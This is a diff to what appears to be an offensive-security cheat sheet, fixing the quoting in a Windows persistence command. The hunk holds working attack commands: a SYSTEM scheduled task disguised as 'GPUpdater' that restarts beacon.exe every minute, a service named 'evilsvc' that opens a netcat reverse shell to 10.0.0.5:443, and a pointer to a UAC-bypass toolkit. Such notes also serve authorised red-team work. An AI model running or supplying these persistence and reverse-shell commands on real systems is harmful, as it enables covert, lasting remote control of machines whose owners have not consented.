@@ -272,7 +272,7 @@ Bypass UAC
   https://github.com/hfiref0x/UACME
     
 Persistance
-  schtasks /create /sc minute /mo 1 /tn "GPUpdater" /ru "SYSTEM" /tr "cmd.exe /C tasklist /FI IMAGENAME eq gpupdater.exe" && if not %ERRORLEVEL%==0 start beacon.exe"
+  schtasks /create /sc minute /mo 1 /tn "GPUpdater" /ru "SYSTEM" /tr "cmd.exe /C tasklist /FI IMAGENAME eq gpupdater.exe && if not %ERRORLEVEL%==0 start beacon.exe"
     Runs every 1 minute to see if gpupdater.exe process is not running and restart it if not
   sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
     sc start evilsvc
